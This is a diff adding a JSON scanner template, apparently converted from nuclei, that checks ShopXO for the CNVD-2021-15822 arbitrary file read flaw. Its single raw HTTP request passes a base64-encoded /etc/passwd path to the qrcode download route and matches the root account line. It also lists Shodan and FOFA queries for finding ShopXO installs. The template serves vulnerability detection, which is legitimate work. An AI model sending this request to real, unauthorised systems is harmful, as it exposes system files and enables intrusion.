@@ -1,0 +1,143 @@
+{
+  "id": "CNVD-2021-15822",
+  "name": "ShopXO Download File Read",
+  "author": "pikpikcu",
+  "severity": "HIGH",
+  "description": "ShopXO is an open source enterprise-level open source e-commerce system. ShopXO has an arbitrary file reading vulnerability, which can be used by attackers to obtain sensitive information.\n",
+  "references": [
+    "https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog"
+  ],
+  "tags": [
+    "cnvd2021",
+    "cnvd",
+    "shopxo",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"ShopXO企业级B2C电商系统提供商\"",
+    "shodan": "title:\"ShopXO企业级B2C电商系统提供商\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /public/index.php?s\u003d/index/qrcode/download/url/L2V0Yy9wYXNzd2Q\u003d  HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2021-15822",
+    "info": {
+      "name": "ShopXO Download File Read",
+      "author": "pikpikcu",
+      "severity": "high",
+      "description": "ShopXO is an open source enterprise-level open source e-commerce system. ShopXO has an arbitrary file reading vulnerability, which can be used by attackers to obtain sensitive information.\n",
+      "reference": [
+        "https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "title:\"ShopXO企业级B2C电商系统提供商\"",
+        "fofa_query": "app\u003d\"ShopXO企业级B2C电商系统提供商\""
+      },
+      "tags": "cnvd2021,cnvd,shopxo,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /public/index.php?s\u003d/index/qrcode/download/url/L2V0Yy9wYXNzd2Q\u003d  HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
